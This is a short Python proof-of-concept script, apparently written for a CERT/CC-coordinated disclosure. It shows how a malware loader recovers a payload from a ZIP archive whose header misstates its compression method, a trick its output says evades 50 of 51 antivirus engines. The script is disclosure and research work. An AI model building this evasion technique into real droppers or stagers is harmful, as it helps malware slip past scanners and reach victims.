#!/usr/bin/env python3
"""
Zombie ZIP Loader PoC
Demonstrates programmatic payload recovery from method_mismatch.zip

This simulates how a malware dropper/stager would extract the real payload
from a Zombie ZIP archive, bypassing the declared compression method and
decompressing the DEFLATE stream directly.

Author: Christopher Aziz / Bombadil Systems
Context: VU#976247 - CERT/CC Coordination
"""

import struct
import zlib
import sys
import hashlib

def extract_real_payload(zip_path: str) -> bytes:
    """
    Extract the actual payload from a method_mismatch ZIP by ignoring
    the declared compression method and decompressing as DEFLATE.
    """
    with open(zip_path, 'rb') as f:
        data = f.read()

    # Parse local file header
    sig = struct.unpack('<I', data[0:4])[0]
    if sig != 0x04034b50:
        raise ValueError("Not a ZIP file")

    method = struct.unpack('<H', data[8:10])[0]
    comp_size = struct.unpack('<I', data[18:22])[0]
    name_len = struct.unpack('<H', data[26:28])[0]
    extra_len = struct.unpack('<H', data[28:30])[0]

    # Locate compressed data
    data_offset = 30 + name_len + extra_len
    comp_data = data[data_offset:data_offset + comp_size]

    print(f"[*] Declared method: {method} ({'STORED' if method == 0 else 'DEFLATE'})")
    print(f"[*] Compressed size: {comp_size} bytes")
    print(f"[*] AV engines trust Method={method} and scan raw bytes — no detection")
    print(f"[*] Attacker ignores declared method, decompresses as DEFLATE...")

    # Ignore the header — decompress as DEFLATE regardless
    payload = zlib.decompress(comp_data, -zlib.MAX_WBITS)

    print(f"[+] Recovered payload: {len(payload)} bytes")
    print(f"[+] SHA-256: {hashlib.sha256(payload).hexdigest()}")

    return payload

if __name__ == "__main__":
    zip_path = sys.argv[1] if len(sys.argv) > 1 else "method_mismatch.zip"

    print(f"[*] Zombie ZIP Loader PoC")
    print(f"[*] Target: {zip_path}")
    print()

    payload = extract_real_payload(zip_path)

    print()
    print(f"[+] Payload content:")
    print(f"    {payload.decode('ascii', errors='replace')}")
    print()
    print(f"[!] This payload was invisible to 50/51 AV engines scanning the ZIP.")
    print(f"[!] A real attacker would now execute this payload in memory.")
